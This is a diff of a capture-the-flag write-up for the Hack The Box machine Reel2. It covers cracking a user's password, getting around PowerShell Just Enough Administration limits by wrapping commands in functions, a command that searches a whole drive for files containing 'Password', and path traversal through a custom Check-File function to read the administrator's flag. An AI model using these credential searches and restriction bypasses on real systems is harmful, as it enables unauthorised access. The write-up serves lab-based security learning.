@@ -8,19 +8,23 @@
 
 Short description to include any strange things to be dealt with
 
-### Useful Skills and Tools
+## Useful Skills and Tools
 
-#### Search for all files that contain a certain text string
+### Search for all files that contain a certain text string
+
+Using PowerShell:
 
 ```text
-dir -r C:\ -EA Silent | Select-String "Sticky"
+dir -r C:\ -EA Silent | Select-String "Password"
 ```
+
+This searches through files in the entire C:\ drive, silently ignoring errors, and selecting any that contain the word "Password" in them.
 
 **Useful thing 2**
 
 * description with generic example
 
-### Enumeration
+## Enumeration
 
 #### Nmap scan
 
@@ -155,21 +159,19 @@ simply led to a 403 - Forbidden error page
 
 ![](../../.gitbook/assets/1-8080-wallstant.png)
 
-led to a login page for something called "WallStant". 
+led to a login page for something called "WallStant".
 
 ![](../../.gitbook/assets/1-8080-wallstant-signup.png)
 
-I created an account, and was logged into something that looks like FaceBook. 
+I created an account, and was logged into something that looks like FaceBook.
 
 ![](../../.gitbook/assets/1-8080-wallstant-edit.png)
 
-I saw a link for editing the profile.  I was hoping for the ability to upload a profile picture, but unfortunately it did not seem to actually be an option.
+I saw a link for editing the profile. I was hoping for the ability to upload a profile picture, but unfortunately it did not seem to actually be an option.
 
 ![](../../.gitbook/assets/1-8080-wallstant-in.png)
 
-On my 'test' user's profile page there was an upload button, 
-
-
+On my 'test' user's profile page there was an upload button,
 
 I tried to upload a PHP code exec script \(not sure if PHP even runs here...\) but the file had to be an image. I was able to upload a photo, so next I loaded burp to see if I could fool it into loading code
 
@@ -185,17 +187,15 @@ I found a number of vulnerabilities associated with this version, including one 
 
 ![](../../.gitbook/assets/2-php-vuln.png)
 
-Unfortunately, after reading the HackerOne report it seemed as if it was not useful in this case unless I could somehow make requests from the machine using curl \(not libcurl\).  
-
-
+Unfortunately, after reading the HackerOne report it seemed as if it was not useful in this case unless I could somehow make requests from the machine using curl \(not libcurl\).
 
 ![](../../.gitbook/assets/1-8080-wallstant-3posts.png)
 
-back on the Wallstant page there was a Trending Posts box that had three potential usernames \(and I saw that one of my XXS tests was trending!\).  I wondered what a 'fika\` was, so I looked it up.
+back on the Wallstant page there was a Trending Posts box that had three potential usernames \(and I saw that one of my XXS tests was trending!\). I wondered what a 'fika\` was, so I looked it up.
 
 * [https://www.swedishfood.com/fika](https://www.swedishfood.com/fika) 
 
-> - fika is a traditional Swedish coffee break with friends
+> * fika is a traditional Swedish coffee break with friends
 
 I wrote words in the trending posts down as potential partial passwords and continued on.
 
@@ -212,7 +212,7 @@ I wrote words in the trending posts down as potential partial passwords and cont
 
 ![](../../.gitbook/assets/1-8080-database.png)
 
-Dirbuster found a `/_database` folder which contained a `wallstant.sql` SQL database. 
+Dirbuster found a `/_database` folder which contained a `wallstant.sql` SQL database.
 
 ![](../../.gitbook/assets/1-8080-database-sn.png)
 
@@ -220,11 +220,11 @@ There was not much useful information other than version numbers
 
 ![](../../.gitbook/assets/1-8080-wallstant-report1.png)
 
-Report a problem?  Sure I was having a problem with accessing your machine, could you let me in?
+Report a problem? Sure I was having a problem with accessing your machine, could you let me in?
 
 ![](../../.gitbook/assets/1-8080-wallstant-report.png)
 
-I wasn't able to get this to connect back to my machine, though.  After testing for XSS, SQLi, and doing other tests in each of the input fields, there did not seem to be much else I could do here. I decided to see if there was anything useful on port 443
+I wasn't able to get this to connect back to my machine, though. After testing for XSS, SQLi, and doing other tests in each of the input fields, there did not seem to be much else I could do here. I decided to see if there was anything useful on port 443
 
 ### Port 443 - HTTPS
 
@@ -395,7 +395,7 @@ Stopped: Tue Feb 16 19:02:58 2021
 
 And then I was able to crack the has in just a few seconds. `k.svensson`'s password was `kittycat1`
 
-### Initial Foothold
+## Initial Foothold
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/reel2]
@@ -448,7 +448,7 @@ NOTE: If you get this error, close powershell, then install **`gss-ntlmssp`**. T
 New-PSSession: [10.10.10.210] Connecting to remote server 10.10.10.210 failed with the following error message : acquiring creds with username only failed Unspecified GSS failure.  Minor code may provide more information SPNEGO cannot find mechanisms to negotiate For more information, see the about_Remote_Troubleshooting Help topic.
 ```
 
-* https://www.reddit.com/r/PowerShell/comments/6itek2/powershell\_remoting\_linux\_windows\_with\_spnego/dj9auuq/ 
+* [https://www.reddit.com/r/PowerShell/comments/6itek2/powershell\_remoting\_linux\_windows\_with\_spnego/dj9auuq/](https://www.reddit.com/r/PowerShell/comments/6itek2/powershell_remoting_linux_windows_with_spnego/dj9auuq/) 
 {% endhint %}
 
 ```text
@@ -532,21 +532,36 @@ d-----        7/30/2020   5:14 PM                WindowsPowerShell
 
 This made navigating much easier, and only a few characters more than typing the commands normally
 
-I googled the jea\_test\_account.psrc file and found that is related to "Just Enough Administration", which is a
+### JEA - Just Enough Administration
 
-* found [https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/jea/role-capabilities?view=powershell-7.1](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/jea/role-capabilities?view=powershell-7.1)
+I googled the `jea_test_account.psrc` file and found that is related to "Just Enough Administration", which after a little research I was able to find the Microsoft documentation that described it.
+
+* [https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/jea/role-capabilities?view=powershell-7.1](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/jea/role-capabilities?view=powershell-7.1)
 
 > A role capability is a PowerShell data file with the .psrc extension that lists all the cmdlets, functions, providers, and external programs that are made available to connecting users.
 
-This is the file that seems to be limiting the commands that are available when I logged in. This is also why Evil-Winrm broke, since it seems to use Invoke-Expression for all of its commands. I have bypassed similar restrictions by using functions before
+This is the file that seems to be limiting the commands that are available when I logged in. This is also why `Evil-Winrm` broke, since it seems to use `Invoke-Expression` for all of its commands. I have bypassed similar restrictions by using functions before, so that is how what I tried here worked.
 
-### Road to User
+```text
+CommandType Name Version Source
 
-#### Further enumeration
+Function Clear-Host  
+Function Exit-PSSession  
+Function Get-Command  
+Function Get-FormatData  
+Function Get-Help  
+Function Measure-Object  
+Function Out-Default  
+Function Select-Object
+```
 
-#### Finding user creds
+I checked the list of currently available commands, and was given a very limited set. This is how JEA limits users. However it explicitly says on the documentation page:
 
-#### User.txt
+> For more complex command invocations that make this approach difficult, consider using implicit remoting or creating custom functions that wrap the functionality you require.
+
+When I ran `Get-Command` again inside my custom function, the list kept going and going. It seemed like I was able to use the full gamut of commands inside a function, but very few in the normal session.
+
+### User.txt
 
 ```text
 [10.10.10.210]: P> .{cd ..\Desktop/} 
@@ -566,15 +581,13 @@ d-----        2/12/2021   5:12 PM                WinDirStatPortable
 88fe9f1ba18d0a89e4b67277fba820de
 ```
 
-### Path to Power \(Gaining Administrator Access\)
+On `k.svensson`'s Desktop I found the `user.txt` proof file.
 
-#### Enumeration as k.svensson
+## Path to Power \(Gaining Administrator Access\)
 
-Saw a link for the sticky notes program, which seemed like a good place to search for secrets
+### Enumeration as k.svensson
 
-**Search for all files that contain a certain text string**
-
-dir -r C: -EA Silent \| Select-String "Sticky"
+Saw a link for the sticky notes program, which seemed like a good place to search for secrets.  Next I searched the user's folder for any files that referenced "sticky" to see what I could find.
 
 ```text
 [10.10.10.210]: PS>.{dir -r C:\Users\k.svensson\ -EA Silent | Select-String "sticky"}
@@ -609,16 +622,16 @@ ta\Local\Programs\stickynotes\stickynotes.exe
 ickynotes
 ```
 
-The stickynotes application was isntalled in `%USERPROFILE%\AppData\Local\Programs\stickynotes\`. This seemed like a likely place for the user to have stored interesting information, such as potential credentials.
+The stickynotes application was installed in `%USERPROFILE%\AppData\Local\Programs\stickynotes\`. This seemed like a likely place for the user to have stored interesting information, such as potential credentials.
 
 {% hint style="info" %}
-NOTE: I lost my shell at one point so it hung on any commands.  If you get the above below after a hung PowerShell PSSession, use the shortcut Ctrl-L to exit and return to your local prompt!  
+NOTE: I lost my shell at one point so it hung on any commands. If you get the above below after a hung PowerShell PSSession, use the shortcut Ctrl-L to exit and return to your local prompt!
 
 ```text
 [10.10.10.210]: PS>Starting a command on the remote server failed with the following error message : ERROR_WSMAN_INVALID_SELECTORS: The WS-Management service cannot process the request because the request contained invalid selectors for the resource.  For more information, see the about_Remote_Troubleshooting Help topic.
 ```
 
-Results may vary with this.  For me, it did not work, and I had to kill the terminal entirely.  
+Results may vary with this. For me, it did not work, and I had to kill the terminal entirely.
 {% endhint %}
 
 ```text
@@ -634,154 +647,9 @@ WindowsRegisteredOrganization                           :
 WindowsRegisteredOwner                                  : Windows User
 WindowsSystemRoot                                       : C:\Windows
 BiosCharacteristics                                     : 
-BiosBIOSVersion                                         : 
-BiosBuildNumber                                         : 
-BiosCaption                                             : 
-BiosCodeSet                                             : 
-BiosCurrentLanguage                                     : 
-BiosDescription                                         : 
-BiosEmbeddedControllerMajorVersion                      : 
-BiosEmbeddedControllerMinorVersion                      : 
-BiosFirmwareType                                        : 
-BiosIdentificationCode                                  : 
-BiosInstallableLanguages                                : 
-BiosInstallDate                                         : 
-BiosLanguageEdition                                     : 
-BiosListOfLanguages                                     : 
-BiosManufacturer                                        : 
-BiosName                                                : 
-BiosOtherTargetOS                                       : 
-BiosPrimaryBIOS                                         : 
-BiosReleaseDate                                         : 
-BiosSeralNumber                                         : 
-BiosSMBIOSBIOSVersion                                   : 
-BiosSMBIOSMajorVersion                                  : 
-BiosSMBIOSMinorVersion                                  : 
-BiosSMBIOSPresent                                       : 
-BiosSoftwareElementState                                : 
-BiosStatus                                              : 
-BiosSystemBiosMajorVersion                              : 
-BiosSystemBiosMinorVersion                              : 
-BiosTargetOperatingSystem                               : 
-BiosVersion                                             : 
-CsAdminPasswordStatus                                   : 
-CsAutomaticManagedPagefile                              : 
-CsAutomaticResetBootOption                              : 
-CsAutomaticResetCapability                              : 
-CsBootOptionOnLimit                                     : 
-CsBootOptionOnWatchDog                                  : 
-CsBootROMSupported                                      : 
-CsBootStatus                                            : 
-CsBootupState                                           : 
-CsCaption                                               : 
-CsChassisBootupState                                    : 
-CsChassisSKUNumber                                      : 
-CsCurrentTimeZone                                       : 
-CsDaylightInEffect                                      : 
-CsDescription                                           : 
-CsDNSHostName                                           : 
-CsDomain                                                : 
-CsDomainRole                                            : 
-CsEnableDaylightSavingsTime                             : 
-CsFrontPanelResetStatus                                 : 
-CsHypervisorPresent                                     : 
-CsInfraredSupported                                     : 
-CsInitialLoadInfo                                       : 
-CsInstallDate                                           : 
-CsKeyboardPasswordStatus                                : 
-CsLastLoadInfo                                          : 
-CsManufacturer                                          : 
-CsModel                                                 : 
-CsName                                                  : 
-CsNetworkAdapters                                       : 
-CsNetworkServerModeEnabled                              : 
-CsNumberOfLogicalProcessors                             : 
-CsNumberOfProcessors                                    : 
-CsProcessors                                            : 
-CsOEMStringArray                                        : 
-CsPartOfDomain                                          : 
-CsPauseAfterReset                                       : 
-CsPCSystemType                                          : 
-CsPCSystemTypeEx                                        : 
-CsPowerManagementCapabilities                           : 
-CsPowerManagementSupported                              : 
-CsPowerOnPasswordStatus                                 : 
-CsPowerState                                            : 
-CsPowerSupplyState                                      : 
-CsPrimaryOwnerContact                                   : 
-CsPrimaryOwnerName                                      : 
-CsResetCapability                                       : 
-CsResetCount                                            : 
-CsResetLimit                                            : 
-CsRoles                                                 : 
-CsStatus                                                : 
-CsSupportContactDescription                             : 
-CsSystemFamily                                          : 
-CsSystemSKUNumber                                       : 
-CsSystemType                                            : 
-CsThermalState                                          : 
-CsTotalPhysicalMemory                                   : 
-CsPhyicallyInstalledMemory                              : 
-CsUserName                                              : 
-CsWakeUpType                                            : 
-CsWorkgroup                                             : 
-OsName                                                  : 
-OsType                                                  : 
-OsOperatingSystemSKU                                    : 
-OsVersion                                               : 
-OsCSDVersion                                            : 
-OsBuildNumber                                           : 
-OsHotFixes                                              : 
-OsBootDevice                                            : 
-OsSystemDevice                                          : 
-OsSystemDirectory                                       : 
-OsSystemDrive                                           : 
-OsWindowsDirectory                                      : 
-OsCountryCode                                           : 
-OsCurrentTimeZone                                       : 
-OsLocaleID                                              : 
-OsLocale                                                : 
-OsLocalDateTime                                         : 
-OsLastBootUpTime                                        : 
-OsUptime                                                : 
-OsBuildType                                             : 
-OsCodeSet                                               : 
-OsDataExecutionPreventionAvailable                      : 
-OsDataExecutionPrevention32BitApplications              : 
-OsDataExecutionPreventionDrivers                        : 
-OsDataExecutionPreventionSupportPolicy                  : 
-OsDebug                                                 : 
-OsDistributed                                           : 
-OsEncryptionLevel                                       : 
-OsForegroundApplicationBoost                            : 
-OsTotalVisibleMemorySize                                : 
-OsFreePhysicalMemory                                    : 
-OsTotalVirtualMemorySize                                : 
-OsFreeVirtualMemory                                     : 
-OsInUseVirtualMemory                                    : 
-OsTotalSwapSpaceSize                                    : 
-OsSizeStoredInPagingFiles                               : 
-OsFreeSpaceInPagingFiles                                : 
-OsPagingFiles                                           : 
-OsHardwareAbstractionLayer                              : 
-OsInstallDate                                           : 
-OsManufacturer                                          : 
-OsMaxNumberOfProcesses                                  : 
-OsMaxProcessMemorySize                                  : 
-OsMuiLanguages                                          : 
-OsNumberOfLicensedUsers                                 : 
-OsNumberOfProcesses                                     : 
-OsNumberOfUsers                                         : 
-OsOrganization                                          : 
-OsArchitecture                                          : 
-OsLanguage                                              : 
-OsProductSuites                                         : 
-OsOtherTypeDescription                                  : 
-OsPAEEnabled                                            : 
-OsPortableOperatingSystem                               : 
-OsPrimary                                               : 
-OsProductType                                           : 
-OsRegisteredUser                                        : 
+
+...snipped...                    
+
 OsSerialNumber                                          : 
 OsServicePackMajorVersion                               : 
 OsServicePackMinorVersion                               : 
@@ -878,11 +746,11 @@ Mode                LastWriteTime         Length Name
 -a----        7/30/2020   1:19 PM             41 MANIFEST-000001
 ```
 
-Inside the stickynotes folder there was a `Local Storage` folder with a `leveldb` folder. After searching for leveldb I discovered it was a type of local database, and not related to stickynotes \(at least not Microsoft's set up\). It seemed like this was a custom database setup.
+Inside the `\stickynotes` folder there was a `Local Storage` folder with a `leveldb` folder. After searching for leveldb I discovered it was a type of local database, and not related to the Sticky Notes program \(at least not Microsoft's set up\).  It seemed like this was a custom database setup.
 
 * [https://livebook.manning.com/book/cross-platform-desktop-applications/chapter-12/15](https://livebook.manning.com/book/cross-platform-desktop-applications/chapter-12/15)
 
-It looked possible that this project had been implemented here
+I did some research to see if I could find out anything about this kind of custom set up for this program, and found that there was a community of people who preferred the old Sticky Notes program, and worked out ways to install and run it locally.  It looked possible that this project had been implemented here.
 
 ```text
 [10.10.10.210]: P> .{type Log.old}
@@ -974,44 +842,26 @@ It looked like I had found a password for the `jea_test_account` I had seen file
 * [https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/jea/using-jea?view=powershell-7.1](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/jea/using-jea?view=powershell-7.1)
 
 > To use JEA interactively, you need:
-
-* The name of the computer you're connecting to (can be the local machine)
-* The name of the JEA endpoint registered on that computer
-* Credentials that have access to the JEA endpoint on that computer
-
-> Given that information, you can start a JEA session using the New-PSSession or Enter-PSSession cmdlets. 
-
-```PowerShell
-$nonAdminCred = Get-Credential Enter-PSSession -ComputerName localhost -ConfigurationName JEAMaintenance -Credential $nonAdminCred
-```
-
+>
+> * The name of the computer you're connecting to \(can be the local machine\)
+> * The name of the JEA endpoint registered on that computer
+> * Credentials that have access to the JEA endpoint on that computer
+>
+> Given that information, you can start a JEA session using the New-PSSession or Enter-PSSession cmdlets.
+>
+> ```text
+> $nonAdminCred = Get-Credential Enter-PSSession -ComputerName localhost -ConfigurationName JEAMaintenance -Credential $nonAdminCred
+> ```
+>
 > If the current user account has access to the JEA endpoint, you can omit the Credential parameter.
 
-```
-CommandType Name Version Source
+* [https://stackoverflow.com/questions/10011794/hardcode-password-into-powershells-new-pssession](https://stackoverflow.com/questions/10011794/hardcode-password-into-powershells-new-pssession)
 
-Function Clear-Host  
-Function Exit-PSSession  
-Function Get-Command  
-Function Get-FormatData  
-Function Get-Help  
-Function Measure-Object  
-Function Out-Default  
-Function Select-Object
-```
+In order to pass both the username and password into the `New-PSSession` cmdlet, I had to create a new object that contained this information.
 
-I checked the list of currently available commands, and was given a very limited set.  This is how JEA limits users.  However it explicitly says on the documentation page: 
+### Shell as `jea_test_account`
 
-> For more complex command invocations that make this approach difficult, consider using implicit remoting or creating custom functions that wrap the functionality you require.
-
-When I ran `Get-Command` again inside my custom function, the list kept going and going.  It seemed like I was able to use the full gamut of commands inside a function, but very few in the normal session.
-
-* https://stackoverflow.com/questions/10011794/hardcode-password-into-powershells-new-pssession
-
-In order to pass both the username and password into the New-PSSession cmdlet I had to create a new object that contained this information
-
-## Shell as `jea_test_account`
-```
+```bash
 ┌──(zweilos㉿kali)-[~/htb/reel2]
 └─$ pwsh                       
 PowerShell 7.0.0
@@ -1031,20 +881,18 @@ PS /home/zweilos/htb/reel2> $jeaSession = New-PSSession 10.10.10.210 -Credential
 New-PSSession: [10.10.10.210] Connecting to remote server 10.10.10.210 failed with the following error message : ERROR_ACCESS_DENIED: Access is denied.  For more information, see the about_Remote_Troubleshooting Help topic.                                                                                      
 PS /home/zweilos/htb/reel2> $jeaSession = New-PSSession 10.10.10.210 -Credential $creds -Authentication Negotiate -ConfigurationName "jea_test_account"                                                       
 PS /home/zweilos/htb/reel2> Enter-PSSession $jeaSession
-[10.10.10.210]: PS>
 ```
 
-After creating an object with the credentials, and specifying the connection with the configuration name I was able to connect
+After creating an object with the credentials, and specifying the connection with the configuration name I was able to connect.
 
-
-```
-[10.10.10.210]: PS>whoami     
+```text
+[10.10.10.210]: P> whoami /all
 The term 'whoami.exe' is not recognized as the name of a cmdlet, function, script file, or operable 
 program. Check the spelling of the name, or if a path was included, verify that the path is correct 
 and try again.
     + CategoryInfo          : ObjectNotFound: (whoami.exe:String) [], CommandNotFoundException
     + FullyQualifiedErrorId : CommandNotFoundException
- 
+
 [10.10.10.210]: P> .{whoami /all}
 The syntax is not supported by this runspace. This can occur if the runspace is in no-language mode.
     + CategoryInfo          : ParserError: (.{whoami /all}:String) [], ParseException
@@ -1053,7 +901,7 @@ The syntax is not supported by this runspace. This can occur if the runspace is 
 
 I went from one restricted account to a more restricted account.... "no-language mode" \(google this\)
 
-```
+```text
 CommandType     Name                                               Version    Source                  
 -----------     ----                                               -------    ------                  
 Function        Check-File                                                                            
@@ -1073,7 +921,7 @@ Cannot find path '' because it does not exist.
     + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetHelpCommand
 ```
 
-I used `Get-Command` to see if I had access to the same commands, and found that it was pretty much the same list with one addition. I tried to access the help information for the `Check-File` command, but I got a `Cannot find path` error.
+I used `Get-Command` to see if I had access to the same commands, and found that it was pretty much the same list with one addition.  I tried to access the help information for the `Check-File` command, but I got a `Cannot find path` error.
 
 ```bash
 [10.10.10.210]: P> .{type jea_test_account.psrc}
@@ -1139,7 +987,7 @@ FunctionDefinitions = @{
 # AssembliesToLoad = 'System.Web', 'System.OtherAssembly, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'
 ```
 
-The answer was in the JEA configuration files I had seen earlier. Inside the configuration file `jea_test_account.psrc` there was a definition for a custon function `Check-File`
+The answer was in the JEA configuration files I had seen earlier.  Inside the configuration file `jea_test_account.psrc` there was a definition for a custom function `Check-File`. 
 
 ```bash
 # Functions to define when applied to a session
@@ -1238,7 +1086,7 @@ d-----        7/30/2020   1:17 PM                k.svensson
 d-r---        8/22/2013   5:39 PM                Public
 ```
 
-I was able to link the C drive to the D drive letter, however the `jea_test_account` was not able to see it
+I was able to link the C drive to the D drive letter as  \(original user\), however the `jea_test_account` was not able to see it
 
 * [https://stackoverflow.com/questions/894430/creating-hard-and-soft-links-using-powershell](https://stackoverflow.com/questions/894430/creating-hard-and-soft-links-using-powershell)
 
@@ -1270,16 +1118,14 @@ d----l        2/16/2021  11:19 PM                Desk
 
 desc
 
-#### Getting a shell
-
-#### Root.txt
+### Root.txt
 
 ```text
 [10.10.10.210]: PS>Check-File C:\ProgramData\Desk\Desktop\root.txt                                     
 e145465135ac264800cee7d8dda0dbba
 ```
 
-AFter going through all of the trouble to create a link to the folders, I realized that I could also do it more simply...with directory traversal!
+After going through all of the trouble to create a link to the folders, I realized that I could also do it more simply...with directory traversal!
 
 ```text
 [10.10.10.210]: PS>Check-File C:\ProgramData\..\Users\Administrator\Desktop\root.txt
@@ -1287,7 +1133,7 @@ AFter going through all of the trouble to create a link to the folders, I realiz
 e145465135ac264800cee7d8dda0dbba
 ```
 
-Since the custom function was looking for a path with the -Like parameter and a `*` wildcard, anything could be put after the path `C:\ProgramData\`. This includes directory traversal paths such as `..\`
+Since the custom function was looking for a path with the `-Like` parameter and a `*` wildcard, anything could be put after the path `C:\ProgramData\`. This includes directory traversal paths such as `..\`
 
 Thanks to [`cube0x0`](https://app.hackthebox.eu/users/9164) for something interesting or useful about this machine.
 
